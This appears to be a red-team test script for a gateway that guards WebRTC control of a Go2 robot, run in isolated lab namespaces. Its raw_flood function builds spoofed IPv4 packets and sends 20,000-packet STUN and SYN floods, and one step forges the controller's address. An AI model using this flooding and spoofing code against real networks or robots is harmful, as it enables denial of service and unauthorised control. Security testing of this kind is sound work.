#!/usr/bin/env python3
"""Red team, wave 2: Go2 WebRTC monitoring / blocking in the inline gateway
(`webrtc` section, action block_unlisted, controller 192.168.123.164 bound
to MAC 02:00:00:00:01:64), through the real bridge of gw-setup.sh (PFX=rk).

usage: redteam2_webrtc.py RUN_DIR GW_PID
Each step prints the gateway findings it added (events file), whether the
robot side saw the traffic, and the gateway's RSS.
"""
import json, os, random, socket, struct, sys, threading, time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import rtlib

run, gwpid = sys.argv[1], int(sys.argv[2])
events = f"{run}/gw/events.jsonl"
ROBOT = "192.168.123.161"; CTRL = "192.168.123.164"
results = []


def ev_count():
    import collections
    c = collections.Counter()
    try:
        for l in open(events):
            try:
                e = json.loads(l)
            except ValueError:
                continue
            c[e.get("rule")] += 1
    except OSError:
        pass
    return c


robot_seen = {"tcp_8081": 0, "udp": 0}


def robot_listeners():
    rtlib.netns("rk-rob")
    srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", 8081)); srv.listen(64)
    u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); u.bind(("0.0.0.0", 50001))

    def tcp():
        while True:
            c, _ = srv.accept()
            robot_seen["tcp_8081"] += 1
            try:
                c.settimeout(1); c.recv(65536)
                body = json.dumps({"type": "answer", "sdp": "v=0\r\n"}).encode()
                c.sendall(b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: "
                          + str(len(body)).encode() + b"\r\n\r\n" + body)
            except OSError:
                pass
            c.close()

    def udp():
        while True:
            d, a = u.recvfrom(4096)
            robot_seen["udp"] += 1
            if d[:2] == b"\x00\x01":  # answer STUN binding requests (success)
                u.sendto(b"\x01\x01" + d[2:20], a)
    threading.Thread(target=tcp, daemon=True).start()
    threading.Thread(target=udp, daemon=True).start()


threading.Thread(target=robot_listeners, daemon=True).start()
time.sleep(0.5)


def offer_body():
    sdp = ("v=0\r\no=- 1 2 IN IP4 0.0.0.0\r\ns=-\r\nt=0 0\r\na=ice-ufrag:abcd\r\na=ice-pwd:x\r\n"
           "a=fingerprint:sha-256 AA:BB\r\nm=application 9 UDP/DTLS/SCTP webrtc-datachannel\r\n"
           f"a=candidate:1 1 udp 2122260223 {CTRL} 50000 typ host\r\n")
    b = json.dumps({"sdp": sdp, "type": "offer", "token": "t" * 32}).encode()
    return (b"POST /offer HTTP/1.1\r\nHost: " + ROBOT.encode() + b":8081\r\nContent-Type: application/json\r\n"
            b"Content-Length: " + str(len(b)).encode() + b"\r\n\r\n" + b)


def stun(ufrag=b"wxyz:abcd"):
    attrs = struct.pack("!HH", 0x0006, len(ufrag)) + ufrag + b"\x00" * ((4 - len(ufrag) % 4) % 4)
    attrs += struct.pack("!HHI", 0x802A, 8, 0) + b"\x00" * 4  # ICE-CONTROLLING
    return struct.pack("!HHI", 0x0001, len(attrs), 0x2112A442) + os.urandom(12) + attrs


def dtls_hello():
    body = b"\x01" + b"\x00\x00\x30" + b"\x00\x00" + b"\x00\x00\x00" + b"\x00\x00\x30" + b"\xfe\xfd" + os.urandom(32) + b"\x00" * 14
    return b"\x16\xfe\xff" + b"\x00\x00" + b"\x00" * 6 + struct.pack("!H", len(body)) + body


def session(ns, src_port=50000):
    me = os.open("/proc/self/ns/net", os.O_RDONLY)
    rtlib.netns(ns)
    out = {}
    try:
        s = socket.create_connection((ROBOT, 8081), timeout=2)
        s.sendall(offer_body()); s.settimeout(2)
        out["answer"] = s.recv(4096)[:15].decode(errors="replace"); s.close()
    except OSError as e:
        out["tcp"] = repr(e)
    u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); u.bind(("0.0.0.0", src_port)); u.settimeout(1)
    for _ in range(3):
        u.sendto(stun(), (ROBOT, 50001))
    u.sendto(dtls_hello(), (ROBOT, 50001))
    try:
        out["stun_reply"] = len(u.recv(100))
    except OSError:
        out["stun_reply"] = 0
    u.close()
    os.setns(me, rtlib.CLONE_NEWNET); os.close(me)
    return out


def raw_flood(ns, n, kind, src_ips, spoof_mac=False):
    """IPv4 with IP_HDRINCL from `ns`: spoofed sources (same L2 segment)."""
    me = os.open("/proc/self/ns/net", os.O_RDONLY)
    rtlib.netns(ns)
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    t0 = time.time()
    for i in range(n):
        src = src_ips[i % len(src_ips)]
        if kind == "stun":
            payload = stun(); proto = 17
            l4 = struct.pack("!HHHH", random.randint(1024, 65000), random.randint(1024, 65000), 8 + len(payload), 0) + payload
        else:  # tcp SYN to 8081
            proto = 6
            l4 = struct.pack("!HHIIBBHHH", random.randint(1024, 65000), 8081, random.getrandbits(32), 0, 0x50, 0x02, 1024, 0, 0)
        ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(l4), i & 0xFFFF, 0, 64, proto, 0,
                         socket.inet_aton(src), socket.inet_aton(ROBOT))
        ip = ip[:10] + struct.pack("!H", rtlib.ip_csum(ip)) + ip[12:]
        try:
            s.sendto(ip + l4, (ROBOT, 0))
        except OSError:
            pass
    s.close()
    os.setns(me, rtlib.CLONE_NEWNET); os.close(me)
    return {"sent": n, "pps": round(n / max(time.time() - t0, 1e-3))}


def step(name, fn, settle=3):
    b = ev_count(); seen0 = dict(robot_seen); r0 = rtlib.rss_kib(gwpid)
    info = fn()
    time.sleep(settle)
    a = ev_count()
    res = {"step": name, "info": info, "new_gateway_findings": rtlib.diff(a, b),
           "robot_side": {k: robot_seen[k] - seen0[k] for k in robot_seen},
           "gw_alive": rtlib.alive(gwpid), "gw_rss_kib": [r0, rtlib.rss_kib(gwpid) if rtlib.alive(gwpid) else None]}
    results.append(res)
    print(json.dumps(res), flush=True)


step("W0 listed controller: POST /offer + STUN + DTLS (positive control)", lambda: session("rk-ctrl"))
step("W1 unlisted host 192.168.123.99: POST /offer + STUN + DTLS", lambda: session("rk-atk", 50002))
step("W2 controller's IP from the attacker's MAC (TCP SYN 8081, spoofed source)",
     lambda: raw_flood("rk-atk", 5, "syn", [CTRL]))
spoofed = [f"192.168.123.{i}" for i in range(100, 250)] + [f"10.{i}.{j}.7" for i in range(1, 20) for j in range(1, 50)]
step("W3 STUN flood: 20000 binding requests from ~1100 spoofed sources",
     lambda: raw_flood("rk-atk", 20000, "stun", spoofed), settle=5)
step("W4 SYN flood to 8081: 20000 SYNs from ~1100 spoofed sources",
     lambda: raw_flood("rk-atk", 20000, "syn", spoofed), settle=5)
step("W5 listed controller again after the floods (still served)", lambda: session("rk-ctrl", 50003))
json.dump(results, open(f"{run}/redteam2_webrtc.json", "w"), indent=1)
